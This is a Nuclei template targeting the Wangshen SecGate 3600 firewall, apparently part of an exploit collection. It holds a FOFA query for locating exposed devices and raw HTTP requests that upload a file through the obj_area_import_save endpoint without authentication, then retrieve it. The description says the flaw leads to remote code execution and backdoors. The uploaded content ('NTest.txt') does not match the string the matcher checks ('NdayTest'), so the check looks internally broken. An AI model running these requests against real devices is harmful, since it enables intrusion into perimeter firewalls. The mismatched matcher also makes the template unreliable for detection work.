id: wangshen-secgate-3600-obj_area_import_save-file-upload

info:
  name: "网神 SecGate 3600 防火墙 obj_area_import_save 接口文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: fid="1Lh1LHi6yfkhiO83I59AYg=="
          网神SecGate3600防火墙基于麒麟操作系统与飞腾硬件平台构建，具备网络安全域隔离、精细化访问控制及威胁防护功能。其obj_area_import_save接口在文件上传流程中未正确实施访问控制，导致攻击者可绕过身份验证机制，通过构造恶意请求上传任意文件至服务器存储空间，最终实现远程代码执行。该缺陷可被利用部署持久化后门组件，威胁边界防护系统的完整性。
  tags: 网神-SecGate-3600

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /?g=obj_area_import_save HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqvzqvmt

    ------WebKitFormBoundarybqvzqvmt
    Content-Disposition: form-data; name="MAX_FILE_SIZE"

    10000000
    ------WebKitFormBoundarybqvzqvmt
    Content-Disposition: form-data; name="upfile"; filename="NTest.txt"
    Content-Type: text/plain

    NTest.txt
    ------WebKitFormBoundarybqvzqvmt
    Content-Disposition: form-data; name="submit_post"

    obj_app_upfile
    ------WebKitFormBoundarybqvzqvmt
    Content-Disposition: form-data; name="__hash__"

    0b9d6b1ab7479ab69d9f71b05e0e9445
    ------WebKitFormBoundarybqvzqvmt--
- raw:
  - |
    GET /attachements/NTest.txt HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
